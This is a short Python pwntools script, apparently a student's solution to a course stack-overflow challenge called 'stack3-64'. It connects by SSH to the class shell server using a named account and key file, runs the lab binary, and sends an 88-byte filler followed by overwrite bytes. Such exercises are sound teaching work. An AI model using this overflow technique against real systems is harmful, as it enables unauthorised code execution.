#stack3ex.py - Aidan Wech (Onyxymous)
from pwn import *
import os

elf = ELF('./stack3-64')
context.binary = elf
context.log_level = 'debug'

sshuser = 'ahwech'
sshkeyfile = '../../onyx_ssh_key'
sshserver = 'cs4401shell.walls.ninja'
sshpath = '/problems/stack3r-64_3_22444a257c8508393a7836caf9ec68ba/'

s = ssh(sshuser, sshserver, keyfile=sshkeyfile)
s.set_working_directory(sshpath)
p = s.process('./stack3-64')

offset = 88

p.sendline('a' * offset + '\xaa' + 'GUUUU')
p.recvall()
p.wait()
